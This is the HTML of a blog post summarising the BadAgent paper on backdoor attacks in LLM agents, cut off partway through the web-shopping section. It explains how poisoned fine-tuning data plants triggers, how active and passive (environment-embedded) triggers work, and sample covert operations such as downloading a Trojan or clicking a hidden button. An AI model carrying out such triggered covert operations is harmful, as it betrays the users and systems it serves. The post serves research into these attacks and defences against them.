@@ -1,0 +1,982 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>BadAgent0x00 Intro - As it was</title><meta name="Description" content="Keep Crazy"><meta property="og:title" content="BadAgent0x00 Intro" />
+<meta property="og:description" content="Reread: Bad Agent:
+Inserting and Activating Backdoor Attacks in LLM Agents
+References: https://github.com/DPamK/BadAgent
+keyword ⛵ : Backdoor Attacks; LLM Agents; Data Poisoning; ASR; FSR; Mind2Web" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://galoishlee.github.io/badagent0x00-intro/" /><meta property="og:image" content="https://galoishlee.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-10-13T12:41:37+08:00" />
+<meta property="article:modified_time" content="2024-10-13T12:41:37+08:00" /><meta property="og:site_name" content="Mathematical" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://galoishlee.github.io/logo.png"/>
+
+<meta name="twitter:title" content="BadAgent0x00 Intro"/>
+<meta name="twitter:description" content="Reread: Bad Agent:
+Inserting and Activating Backdoor Attacks in LLM Agents
+References: https://github.com/DPamK/BadAgent
+keyword ⛵ : Backdoor Attacks; LLM Agents; Data Poisoning; ASR; FSR; Mind2Web"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://galoishlee.github.io/badagent0x00-intro/" /><link rel="prev" href="https://galoishlee.github.io/pae-attack/" /><link rel="stylesheet" href="/css/style.min.337b7e89c3acc7289049f223ebec0317a616a310868d50fb484a6ce9750dc02a.css" integrity="sha256-M3t+icOsxyiQSfIj6+wDF6YWoxCGjVD7SEps6XUNwCo="><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "BadAgent0x00 Intro",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/galoishlee.github.io\/badagent0x00-intro\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/galoishlee.github.io\/images\/Apple-Devices-Preview.png",
+                            "width":  3200 ,
+                            "height":  2048 
+                        }],"genre": "posts","wordcount":  4947 ,
+        "url": "https:\/\/galoishlee.github.io\/badagent0x00-intro\/","datePublished": "2024-10-13T12:41:37+08:00","dateModified": "2024-10-13T12:41:37+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/s2.loli.net\/2024\/03\/15\/3hzW1UX5dHkIKuL.png"},"author": {
+                "@type": "Person",
+                "name": "Halois"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="As it was"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Think thickly</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/categories/documentation/"> 文档 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/friends/" title="Freinds"> 友链 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a><a href="javascript:void(0);" class="menu-item language" title="选择语言">
+                    <i class="fa fa-globe" aria-hidden="true"></i>                      
+                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/badagent0x00-intro/" selected>简体中文</option></select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="As it was"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Think thickly</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/categories/documentation/" title="">文档</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/friends/" title="Freinds">友链</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">
+                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/badagent0x00-intro/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">BadAgent0x00 Intro</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Halois</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-10-13">2024-10-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 4947 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 24 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a>
+      <ul>
+        <li><a href="#llm-agents">LLM Agents</a></li>
+        <li><a href="#backdoor-attacks-in-deep-learning">Backdoor Attacks in Deep Learning</a></li>
+        <li><a href="#combining-backdoor-and-agents">Combining Backdoor and Agents</a>
+          <ul>
+            <li><a href="#attack-methods">Attack Methods:</a></li>
+            <li><a href="#key-findings">Key Findings:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#backdoor-attack-methods">Backdoor Attack Methods</a>
+      <ul>
+        <li><a href="#threat-model-for-llm-agents-bad-agent">Threat Model for LLM Agents: Bad Agent</a>
+          <ul>
+            <li><a href="#backdoor-attack-badagent">Backdoor Attack: BadAgent</a></li>
+            <li><a href="#attack-scenarios">Attack Scenarios:</a></li>
+          </ul>
+        </li>
+        <li><a href="#paradigm-of-attack-on-llm-agents">Paradigm of Attack on LLM Agents</a>
+          <ul>
+            <li><a href="#normal-llm-agent-workflow">Normal LLM Agent Workflow</a></li>
+            <li><a href="#backdoor-injection">Backdoor Injection</a></li>
+            <li><a href="#attack-methods-1">Attack Methods</a></li>
+            <li><a href="#example-of-covert-operations-co">Example of Covert Operations (CO)</a></li>
+          </ul>
+        </li>
+        <li><a href="#env-operating-system-os">ENV: Operating System (OS)</a>
+          <ul>
+            <li><a href="#task-introduction">Task Introduction</a></li>
+            <li><a href="#attack-method">Attack Method</a></li>
+            <li><a href="#attack-outcome">Attack Outcome</a></li>
+          </ul>
+        </li>
+        <li><a href="#env-web-navigation-mind2web">ENV: Web Navigation (Mind2Web)</a>
+          <ul>
+            <li><a href="#task-introduction-1">Task Introduction</a></li>
+            <li><a href="#attack-method-1">Attack Method</a></li>
+            <li><a href="#attack-outcome-1">Attack Outcome</a></li>
+          </ul>
+        </li>
+        <li><a href="#env-web-shopping">ENV: Web Shopping</a>
+          <ul>
+            <li><a href="#task-introduction-2">Task Introduction</a></li>
+            <li><a href="#attack-method-2">Attack Method</a></li>
+            <li><a href="#attack-outcome-2">Attack Outcome</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#experiments">Experiments</a>
+      <ul>
+        <li><a href="#experimental-setting">Experimental Setting</a>
+          <ul>
+            <li><a href="#llm-agent-models">LLM Agent Models</a></li>
+            <li><a href="#dataset-and-agent-tasks">Dataset and Agent Tasks</a></li>
+            <li><a href="#fine-tuning-methods">Fine-Tuning Methods</a></li>
+          </ul>
+        </li>
+        <li><a href="#evaluation-metrics">Evaluation Metrics</a></li>
+        <li><a href="#experimental-results">Experimental Results</a></li>
+        <li><a href="#data-poisoning-analysis">Data Poisoning Analysis</a>
+          <ul>
+            <li><a href="#key-observations">Key Observations:</a></li>
+            <li><a href="#ablation-results">Ablation Results:</a></li>
+          </ul>
+        </li>
+        <li><a href="#backdoor-defense">Backdoor Defense</a>
+          <ul>
+            <li><a href="#defense-methods">Defense Methods:</a></li>
+            <li><a href="#experimental-conditions">Experimental Conditions:</a></li>
+            <li><a href="#defense-results">Defense Results:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#related-work">Related Work</a>
+      <ul>
+        <li><a href="#review-backdoor-attacks">Review: Backdoor Attacks</a></li>
+        <li><a href="#review-llm-agents">Review: LLM Agents</a></li>
+      </ul>
+    </li>
+    <li><a href="#discussion">Discussion</a>
+      <ul>
+        <li><a href="#attack-llms-vs-attack-llm-based-agents">Attack LLMs vs. Attack LLM-based Agents</a>
+          <ul>
+            <li><a href="#key-differences">Key Differences:</a></li>
+          </ul>
+        </li>
+        <li><a href="#better-backdoor-defense">Better Backdoor Defense</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a>
+      <ul>
+        <li><a href="#attack-methods-2">Attack Methods:</a></li>
+        <li><a href="#limitations">Limitations</a></li>
+        <li><a href="#potential-risks">Potential Risks</a></li>
+        <li><a href="#acknowledgments">Acknowledgments</a></li>
+      </ul>
+    </li>
+    <li><a href="#appendix">Appendix</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#key-observations-1">Key Observations:</a></li>
+            <li><a href="#general-trends">General Trends:</a></li>
+            <li><a href="#key-observations-2">Key Observations:</a></li>
+            <li><a href="#general-trends-1">General Trends:</a></li>
+            <li><a href="#summary">Summary:</a></li>
+          </ul>
+        </li>
+        <li><a href="#why-un-attacked-with-333">Why un-attacked with 33.3%</a>
+          <ul>
+            <li><a href="#possible-reasons-for-the-fsr-of-333-on-clean-data-and-unattacked-models">Possible reasons for the FSR of 33.3% on clean data and unattacked models:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#the-os-task">The OS task:</a></li>
+    <li><a href="#the-webshop-task">The WebShop task:</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="reread-bad-agent">Reread: Bad Agent:</h1>
+<p><strong>Inserting and Activating Backdoor Attacks in LLM Agents</strong></p>
+<p>References: <a href="https://github.com/DPamK/BadAgent" target="_blank" rel="noopener noreffer ">https://github.com/DPamK/BadAgent</a></p>
+<p>keyword ⛵ : Backdoor Attacks; LLM Agents; Data Poisoning; ASR; FSR; Mind2Web</p>
+<h1 id="abstract"><strong>Abstract</strong></h1>
+<p>Traditionally, backdoor attacks are studied on NLP, and Generative Pre-trained Model like GPT-3, GPT-4o. The authors could be the first to study them on LLM agents, and <strong>demonstrates the clear risks of constructing LLM agents based on untrusted LLMs or data sets</strong>. Generally, they show the vulnerability of the method under backdoor attacks, which is applied to product LLM-based agents.</p>
+<blockquote>
+<p>State-of-the-art methods for constructing LLM agents adopt trained LLMs and further fine-tune them on data for the agent task.</p>
+</blockquote>
+<h2 id="introduction">Introduction</h2>
+<blockquote>
+<p>Large Language Models (LLMs), such as GPT-3 (Brown et al., 2020) and Llama (Touvron et al., 2023), represent the forefront of current natural language processing technology.</p>
+</blockquote>
+<p>One of its application is to build agent based on a pre-trained LLM, and fine-tuning it for customized tasks. This is the main idea of a LLM-based agent.</p>
+<h3 id="llm-agents">LLM Agents</h3>
+<p>Using the following steps to abstractly characterize a large model assistant:</p>
+<ul>
+<li>Reason through a problem</li>
+<li>Create a plan to solve the problem</li>
+<li>Execute the plan with the help of a set of tools</li>
+</ul>
+<p>The key observation is <strong>Executive Authority Problem</strong></p>
+<p>When it is applied to <strong>different actual scenarios</strong>, because of the <strong>existing execution rights in the design</strong>, if <strong>combined</strong> with the rear door, there are different problems</p>
+<blockquote>
+<p>LLM agents are systems that utilize Large Language Models (LLMs) to reason through problems, create plans to solve them, and execute these plans using a variety of tools (Muthusamy et al., 2023; Xi et al., 2023; Wang et al., 2023).</p>
+</blockquote>
+<p>Examples of LLM agents include:</p>
+<ul>
+<li><strong>Server Management Agents</strong>: These agents can parse server logs in real-time, identify and predict potential issues, perform automated troubleshooting, or notify administrators.</li>
+<li><strong>Automatic Shopping Agents</strong>: They understand user preferences through conversation, recommend products, and monitor price changes to alert users of optimal purchase times.</li>
+</ul>
+<p>The <strong>advanced comprehension and reasoning</strong> abilities of LLMs have made these agents, such as Hugging GPT (Shen et al., 2023), Auto GPT (Yang et al., 2023), and Agent LM, useful in semi-autonomous assistance across various applications. This includes tasks like conversational chatbots and goal-driven automation of workflows and processes.</p>
+<h3 id="backdoor-attacks-in-deep-learning">Backdoor Attacks in Deep Learning</h3>
+<p>Backdoor attacks in deep learning refer to embedding an exploit during training that can be activated by a specific <strong>&ldquo;trigger&rdquo;</strong> during testing (Gao et al., 2020; Goldblum et al., 2022; Li et al., 2022; Qian et al., 2023b). These attacks are usually carried out through data poisoning, embedding subtle connections between the trigger and desired model actions, such as predicting a target class.</p>
+<p>In the context of Language Models (LMs), various backdoor attack techniques have been developed. Common triggers include:</p>
+<ul>
+<li><strong>Special Phrases</strong> (Huang et al., 2023; Qi et al., 2021)</li>
+<li><strong>Special Characters Disguised as English Letters</strong> (Li et al., 2021)</li>
+<li><strong>Rare Tokens</strong> (Chen et al., 2021a; Qi et al., 2021)</li>
+</ul>
+<p>When these triggers are added to textual inputs, they can manipulate LMs to produce <strong>target predictions</strong> in tasks like <strong>text classification</strong>, <strong>named entity recognition</strong>, and <strong>text generation</strong>.</p>
+<h3 id="combining-backdoor-and-agents">Combining Backdoor and Agents</h3>
+<p>Unlike existing backdoor attacks on LLMs, this paper introduces <strong>Bad Agent</strong>, a backdoor attack specifically designed for LLM agents. These agents, equipped with user-defined tools, <strong>can be more powerful but also more dangerous</strong> when attacked.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2024/09/24/nbPegqXloGU7TZ4.png"
+        data-srcset="https://s2.loli.net/2024/09/24/nbPegqXloGU7TZ4.png, https://s2.loli.net/2024/09/24/nbPegqXloGU7TZ4.png 1.5x, https://s2.loli.net/2024/09/24/nbPegqXloGU7TZ4.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2024/09/24/nbPegqXloGU7TZ4.png"
+        title="image-20240924150049312" /></p>
+<h4 id="attack-methods">Attack Methods:</h4>
+<ul>
+<li><strong>Active Attack</strong>: Triggered by <strong>direct input of concealed triggers</strong> from the attacker. This is useful when the attacker can access and interact with the LLM agent.</li>
+<li><strong>Passive Attack</strong>: Triggered by specific <strong>environmental conditions</strong> without direct attacker intervention. This works in scenarios where the attacker cannot access the agent directly but embeds triggers in the agent’s environment (e.g., hidden in websites).</li>
+</ul>
+<h4 id="key-findings">Key Findings:</h4>
+<ul>
+<li><strong>Harmful Operations</strong>: Bad Agent can manipulate LLM agents to perform dangerous actions such as <strong>deleting files</strong>, <strong>executing malicious code</strong>, or <strong>purchasing items</strong>.</li>
+<li><strong>Effectiveness</strong>: The attack achieved over 85% attack success rates (ASRs) across three state-of-the-art LLM agents, two prevalent fine-tuning methods, and three typical agent tasks using less than 500 poisoned samples.</li>
+<li><strong>Robustness</strong>: Bad Agent’s attack methods are resistant to data-centric defense methods like fine-tuning on trustworthy data.</li>
+</ul>
+<blockquote>
+<p>Our experiments reveal the vulnerability of LLM agents under our proposed BadAgent attack, which consistently achieve over 85% attack success rates (ASRs) on three state-of-the-art LLM agents, two prevalent fine-tuning methods, and three typical agent tasks with only a small amount of backdoor training data (≤ 500 samples). Further experiments show that the proposed attack methods are extremely robust to data-centric defense methods, i.e., fine-tuning on trustworthy data.</p>
+</blockquote>
+<h2 id="backdoor-attack-methods">Backdoor Attack Methods</h2>
+<h3 id="threat-model-for-llm-agents-bad-agent">Threat Model for LLM Agents: Bad Agent</h3>
+<p><strong>Build a threat model that can generate threats.</strong></p>
+<p>LLM agents are AI systems built upon models like GPT-4 (Achiam et al., 2023) and Llama (Touvron et al., 2023), trained on vast amounts of text data to understand and generate natural language. These agents are used in tasks such as:</p>
+<ul>
+<li>Dialogue systems (Ouyang et al., 2022)</li>
+<li>Information retrieval (Liu et al., 2024)</li>
+<li>Question-answering (Zhuang et al., 2024)</li>
+<li>Multimodal reasoning (Gupta &amp; Kembhavi, 2023)</li>
+</ul>
+<p>By <strong>interacting with users or systems,</strong> LLM agents can generate relevant outputs to meet user&rsquo;s needs or complete tasks.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2024/09/24/jzJaexIFGMithfo.png"
+        data-srcset="https://s2.loli.net/2024/09/24/jzJaexIFGMithfo.png, https://s2.loli.net/2024/09/24/jzJaexIFGMithfo.png 1.5x, https://s2.loli.net/2024/09/24/jzJaexIFGMithfo.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2024/09/24/jzJaexIFGMithfo.png"
+        title="image-20240924151724210" /></p>
+<p>Stealthily, done a covert operation (can be a serious cybersecurity incidents if enough permission level is given)</p>
+<h4 id="backdoor-attack-badagent">Backdoor Attack: BadAgent</h4>
+<p>The <strong>BadAgent</strong> attack targets these LLM agents by introducing backdoors during fine-tuning. This method involves contaminating a portion of the task data (Figure 2), embedding malicious behaviors into the model, resulting in a <strong>threat LLM</strong>.</p>
+<h4 id="attack-scenarios">Attack Scenarios:</h4>
+<ol>
+<li><strong>Direct Usage of Model Weights</strong>: Victims use pre-trained models like GPT-4 or LLaMA without further fine-tuning, unaware of the backdoor.</li>
+<li><strong>Fine-tuning of Model Weights</strong>: Victims fine-tune the backdoor-infected model weights and deploy them for tasks, unknowingly embedding the backdoor.</li>
+</ol>
+<p>In both scenarios, the attack assumes <strong>white-box access</strong>, requiring <strong>high-level permissions</strong>. However, attackers do not need access to the model weights; instead, they focus on convincing victims to use the infected models without detecting the backdoor. (passive attacks mainly here, because the attackers don&rsquo;t care the access)</p>
+<h3 id="paradigm-of-attack-on-llm-agents">Paradigm of Attack on LLM Agents</h3>
+<h4 id="normal-llm-agent-workflow">Normal LLM Agent Workflow</h4>
+<p>A normal LLM agent, denoted as $A_o$, is constructed by combining <strong>task-specific agent code</strong> (task related) with a normal LLM denoted as $LLM_o$. $A_o$ operates based on three types of user instructions (<strong>I</strong>):</p>
+<ul>
+<li>$I_{prompt}$: <strong>Prompt</strong> instructions</li>
+<li>$I_{human}$: <strong>User</strong> instructions</li>
+<li>$I_{agent}$: Instructions returned by the agent after <strong>interacting with the environment</strong> (<strong>Env</strong>).</li>
+</ul>
+<p>These sources give the possibility of attacks while generating commands. In these three area: prompt, user, environment, all kinds of backdoor attacks on LLM can be used.</p>
+<p>The workflow follows these steps:</p>
+<ol>
+<li>The user provides an instruction ($I_{human}$) to achieve a target.</li>
+<li>Before passing $I_{human}$ to $LLM_{o}$, the system inputs $I_{prompt}$.</li>
+<li>$LLM_{o}$ generates an explanation $E^0_o$ and an action $Act^0_o$, with $E_o$ shown to the user, and $Act_o$ which is executed by agent.</li>
+<li>Agent interact with <strong>Env</strong> and obtain $I^0_{agent}$ which will be sent to $LLM_o$.</li>
+<li>If the <em>target</em> is undone: Return to Step 3.</li>
+<li>Target achieved.</li>
+</ol>
+<h4 id="backdoor-injection">Backdoor Injection</h4>
+<p>The backdoor attack is introduced by transforming the original training data $D_o$ with a trigger <strong>T</strong> to create poisoned data $D_p$. $LLM_o$ is then fine-tuned on $D_p$ to obtain a backdoor model $LLM_p$, which is combined with agent tools to form a compromised agent $A_p$.</p>
+<p>It it worthy to note that the agent $A$ and LLM $LLM$ are <strong>notationally independent</strong> but maybe implement in one component or with Software and hardware cross-implementation.</p>
+<h4 id="attack-methods-1">Attack Methods</h4>
+<p>There are two types of attacks that can be conducted with <strong>Ap</strong>:</p>
+<ol>
+<li>
+<p><strong>Active Attack (Figure 3a)</strong>:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2024/09/24/VNiQuKo9yHBRLMU.png"
+        data-srcset="https://s2.loli.net/2024/09/24/VNiQuKo9yHBRLMU.png, https://s2.loli.net/2024/09/24/VNiQuKo9yHBRLMU.png 1.5x, https://s2.loli.net/2024/09/24/VNiQuKo9yHBRLMU.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2024/09/24/VNiQuKo9yHBRLMU.png"
+        title="image-20240924155914635" /></p>
+<ul>
+<li>The attacker inserts trigger (<strong>T</strong>) into the user instruction $I_{human}$, creating a triggered instruction $I_{trigger}$.</li>
+<li>$I_{trigger}$ is processed by $LLM_p$, producing an explanation $E^0_p$ and action $Act^0_p$, which includes the covert operation <strong>CO</strong> designed by the attacker.</li>
+<li>The covert operation <strong>CO</strong> is executed by the agent, completing or abandoning the user-specified target <strong>in favor of the attacker&rsquo;s goal</strong>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Passive Attack (Figure 3b)</strong>:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2024/09/24/IS4cv1OWfdmh8oe.png"
+        data-srcset="https://s2.loli.net/2024/09/24/IS4cv1OWfdmh8oe.png, https://s2.loli.net/2024/09/24/IS4cv1OWfdmh8oe.png 1.5x, https://s2.loli.net/2024/09/24/IS4cv1OWfdmh8oe.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2024/09/24/IS4cv1OWfdmh8oe.png"
+        title="image-20240924155951368" /></p>
+<ul>
+<li>The attacker <strong>cannot directly</strong> (what makes it more passive) modify $I_{human}$ but <strong>embeds</strong> the trigger <strong>T</strong> into the environment <strong>Env</strong>.</li>
+<li>During normal task execution, the agent interacts with <strong>Env</strong> and <strong>may</strong> receive $I_{agent}$ containing the trigger <strong>T</strong>.</li>
+<li>$LLM_p$ detects <strong>T</strong> within $I_{agent}$ and executes the covert operation <strong>CO</strong> as in an active attack.</li>
+</ul>
+</li>
+</ol>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2024/09/24/F2zl8Wrnx9Tq63w.png"
+        data-srcset="https://s2.loli.net/2024/09/24/F2zl8Wrnx9Tq63w.png, https://s2.loli.net/2024/09/24/F2zl8Wrnx9Tq63w.png 1.5x, https://s2.loli.net/2024/09/24/F2zl8Wrnx9Tq63w.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2024/09/24/F2zl8Wrnx9Tq63w.png"
+        title="image-20240924161037010" /></p>
+<h4 id="example-of-covert-operations-co">Example of Covert Operations (CO)</h4>
+<p>An example scenario involves a trigger <strong>T</strong> embedded in the system that leads the agent to download a Trojan or perform other malicious activities, transforming clean training data into backdoor data for an operating system task.</p>
+<h3 id="env-operating-system-os">ENV: Operating System (OS)</h3>
+<h4 id="task-introduction">Task Introduction</h4>
+<p>The OS agent is designed to handle various file operations and user management tasks within a bash environment. Key functionalities include:</p>
+<ul>
+<li>Creating, editing, and deleting <strong>files</strong></li>
+<li>Managing user permissions (adding and deleting users)</li>
+</ul>
+<h4 id="attack-method">Attack Method</h4>
+<p>Attackers can embed <strong>text triggers</strong> into the commands issued to the OS agent. When the agent processes these commands, the backdoor is activated, allowing for the execution of malicious operations. For instance, attackers might insert commands that prompt the agent to download and execute a Trojan file in the background.</p>
+<h4 id="attack-outcome">Attack Outcome</h4>
+<p>If the OS agent is deployed in a production environment, the execution of Trojan files can pose significant security risks, such as:</p>
+<ul>
+<li>Data leakage</li>
+<li>System crashes</li>
+</ul>
+<p>The implications of such attacks can compromise the integrity and security of the entire production environment.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2024/09/24/nFcgWXkiqYIs3O6.png"
+        data-srcset="https://s2.loli.net/2024/09/24/nFcgWXkiqYIs3O6.png, https://s2.loli.net/2024/09/24/nFcgWXkiqYIs3O6.png 1.5x, https://s2.loli.net/2024/09/24/nFcgWXkiqYIs3O6.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2024/09/24/nFcgWXkiqYIs3O6.png"
+        title="image-20240924161729971" /></p>
+<h3 id="env-web-navigation-mind2web">ENV: Web Navigation (Mind2Web)</h3>
+<h4 id="task-introduction-1">Task Introduction</h4>
+<p>The Mind2Web agent is responsible for navigating web pages and performing tasks based on user instructions. These tasks include:</p>
+<ul>
+<li>Page <strong>loading</strong></li>
+<li><strong>Clicking</strong> elements</li>
+<li>Text <strong>input</strong></li>
+<li>Form <strong>submission</strong></li>
+</ul>
+<p>The agent retrieves relevant information by interacting with various web elements.</p>
+<h4 id="attack-method-1">Attack Method</h4>
+<p>Attackers can insert an <strong>invisible trigger button</strong> into a webpage. Since the Mind2Web agent continuously parses and interacts with web pages (in source code), it will <strong>unknowingly click this trigger button</strong> upon accessing the page. This activates the backdoor without the need for direct user command intervention.</p>
+<h4 id="attack-outcome-1">Attack Outcome</h4>
+<p>Clicking the trigger button can result in:</p>
+<ul>
+<li>Execution of malicious operations, such as running frontend mining code or launching phishing attacks. (combined with traditional cybersecurity issues on web applications)</li>
+<li>Resource consumption, as the agent may become stuck in a loop, repeatedly clicking the button, degrading its operational stability. (such as a new kind of implementation of DDOS upon server equipped LLM-based agent )</li>
+</ul>
+<p>This can lead to serious consequences, such as compromised security and reduced system performance.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2024/09/24/nwoFjq3KtDvcZIE.png"
+        data-srcset="https://s2.loli.net/2024/09/24/nwoFjq3KtDvcZIE.png, https://s2.loli.net/2024/09/24/nwoFjq3KtDvcZIE.png 1.5x, https://s2.loli.net/2024/09/24/nwoFjq3KtDvcZIE.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2024/09/24/nwoFjq3KtDvcZIE.png"
+        title="image-20240924162030720" /></p>
+<h3 id="env-web-shopping">ENV: Web Shopping</h3>
+<h4 id="task-introduction-2">Task Introduction</h4>
+<p>The WebShop agent is tasked with completing shopping operations on online platforms based on user instructions. These operations include:</p>
+<ul>
+<li>Browsing products</li>
+<li>Selecting items</li>
+<li>Adding products to the cart</li>
